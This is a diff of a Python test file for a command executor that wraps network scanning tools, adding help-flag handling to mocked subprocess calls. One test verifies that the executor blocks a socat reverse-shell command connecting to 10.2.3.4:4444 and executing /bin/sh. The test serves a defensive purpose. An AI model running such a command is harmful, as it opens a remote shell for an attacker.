@@ -47,6 +47,8 @@ def test_run_retries_on_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
     calls = {"count": 0}
 
     def fake_run(cmd, **kwargs):
+        if "-h" in cmd:
+            return subprocess.CompletedProcess(cmd, 0, stdout="-tech-detect -status-code -follow-redirects", stderr="")
         calls["count"] += 1
         if calls["count"] == 1:
             raise subprocess.TimeoutExpired(cmd=cmd, timeout=kwargs.get("timeout", 0))
@@ -59,11 +61,12 @@ def test_run_retries_on_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
     assert result.returncode == 0
     assert calls["count"] == 2
 
-
 def test_circuit_breaker_blocks_after_threshold(monkeypatch: pytest.MonkeyPatch) -> None:
     calls = {"count": 0}
 
     def fake_run(cmd, **kwargs):
+        if "-h" in cmd:
+            return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
         calls["count"] += 1
         raise subprocess.CalledProcessError(returncode=2, cmd=cmd, stderr="failed")
 
@@ -83,6 +86,8 @@ def test_run_to_file_retries_non_zero_exit(monkeypatch: pytest.MonkeyPatch, tmp_
     calls = {"count": 0}
 
     def fake_run(cmd, **kwargs):
+        if "-h" in cmd:
+            return subprocess.CompletedProcess(cmd, 0, stdout="-tech-detect -status-code -follow-redirects", stderr="")
         calls["count"] += 1
         handle = kwargs.get("stdout")
         if handle:
@@ -194,7 +199,7 @@ def test_run_blocks_socat_reverse_shell_exec(monkeypatch: pytest.MonkeyPatch) ->
 
     monkeypatch.setattr(subprocess, "run", fake_run)
     executor = CommandExecutor(DummyLogger())
-    with pytest.raises(CommandError, match="socat reverse-shell style execution payload"):
+    with pytest.raises(CommandError, match="socat potential reverse-shell execution payload"):
         executor.run(["socat", "TCP:10.2.3.4:4444", "EXEC:/bin/sh"], check=False)
     assert called["count"] == 0
 
